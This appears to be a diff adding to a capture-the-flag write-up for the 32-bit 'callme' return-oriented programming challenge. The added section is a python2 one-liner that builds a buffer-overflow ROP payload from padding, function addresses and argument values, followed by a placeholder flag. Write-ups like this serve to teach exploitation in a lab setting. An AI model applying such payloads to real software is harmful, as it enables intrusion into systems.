@@ -53,3 +53,17 @@ Next is to find the buffer size.
 44
 
 encode everything in little endian and send it to a payload.
+```bash
+python2 -c 'print "A"*44 + "\xf0\x84\x04\x08" + "\xf9\x87\x04\x08" + "\xef\xbe\xad\xde" + "\xbe\xba\xfe\xca" + "\x0d\xf0\x0d\xd0"+"\x50\x85\x04\x08"+"\xf9\x87\x04\x08" + "\xef\xbe\xad\xde" + "\xbe\xba\xfe\xca" + "\x0d\xf0\x0d\xd0" +"\xe0\x84\x04\x08" +"\xf9\x87\x04\x08" + "\xef\xbe\xad\xde" + "\xbe\xba\xfe\xca" + "\x0d\xf0\x0d\xd0"' > callme-32-payload
+```
+
+Which gives the flag :)
+```flag
+ROPE{a_placeholder_32byte_flag!}
+```
+
+
+---
+Creation date: 13-10-2022
+Last modified date: Thursday 13th October 2022
+***
